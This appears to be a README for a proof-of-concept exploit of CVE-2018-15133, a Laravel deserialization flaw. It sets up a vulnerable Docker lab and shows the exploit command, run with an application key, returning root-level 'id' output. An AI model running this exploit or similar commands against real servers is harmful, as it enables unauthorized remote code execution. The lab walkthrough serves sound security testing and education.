## Summary:

MExploiting CVE-2018-15133 Deserialization Vulnerability
This exploit takes advantage of a deserialization vulnerability in the Laravel Framework through 5.5.40 and 5.6.x through 5.6.29.

## Description

Remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.

## Prerequisites
To execute this exploit, you need to have the following installed on your machine:

- Docker in the principal os https://docs.docker.com/desktop/install/windows-install/
- This Docker machine https://hub.docker.com/r/kozmico/laravel-poc-cve-2018-15133
- The exploit of this repository.
- The attacker machine, in this case I will use a kali linux machine running in vmware with bridged mode.


## Steps To Reproduce:

1. Download and install docker.
2. open docker with administrator.

3. Open the cmd and pull the docker machine.

`docker pull kozmico/laravel-poc-cve-2018-15133`

4. Start the docker machine:

`docker run --name my-laravel-app -p 8000:80 -d kozmico/laravel-poc-cve-2018-15133`

5. Open docker and start the container:

This will start the larvel machine.
Try to open in the navigator the machine to ensure that the machine is working.
You can do this with the ip and the port, to check the ip on windows run:
`ipconfig`
On linux
`ifconfig`  

6. If you are have issues running docker, probably you will need to run this commands to use docker

`wsl --set-default-version 2`
`wsl --update`

7. At this point, everything should already be set up and the only thing left is to run the exploit.

## Running the Exploit

1. Download the exploit file to your machine.

2. Open a terminal and navigate to the folder where the exploit file is located.

3. Run the following command to exploit the server:

`./CVE-2018-15133 -URL http://localhost:8000 -API_KEY 9UZUmEfHhV7WXXYewtNRtCxAYdQt44IAgJUKXk2ehRk= -command "id"`
This should give you the response with the ID of the machine you want to attack. You can use similar commands to request folders and perform other tasks as well.

Response:
uid=0(root) gid=0(root) groups=0(root)

# Conclusion
In conclusion, in this vulnerability, we were able to observe the importance of staying up to date with frameworks. As these tools can have security flaws and are widely used, we are at risk if we do not keep ourselves updated.

## Reference to:
https://github.com/0xSalle/cve-2018-15133
